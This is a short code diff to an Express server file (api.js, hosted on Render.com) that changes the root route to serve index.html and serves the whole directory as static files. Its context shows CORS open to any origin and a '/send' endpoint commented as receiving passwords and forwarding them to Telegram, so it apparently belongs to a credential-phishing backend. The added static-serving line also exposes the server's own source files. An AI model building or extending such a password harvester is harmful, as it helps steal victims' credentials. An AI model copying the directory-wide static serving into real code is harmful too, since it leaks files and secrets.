@@ -1,5 +1,6 @@
 // api.js - This runs on Render.com
 const express = require('express');
+const path = require('path'); // ← ADD THIS
 const app = express();
 
 // Allow any origin (CORS)
@@ -12,10 +13,13 @@ app.use((req, res, next) => {
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// ✅ ADD THIS ROOT ROUTE
+// ✅ SERVE index.html AT ROOT
 app.get('/', (req, res) => {
-    res.send('✅ Server is running. Send POST requests to /send');
+    res.sendFile(path.join(__dirname, 'index.html'));
 });
+
+// Also serve static files (CSS, JS, images) from the same directory
+app.use(express.static(__dirname));
 
 // Endpoint to receive password and forward to Telegram
 app.post('/send', async (req, res) => {
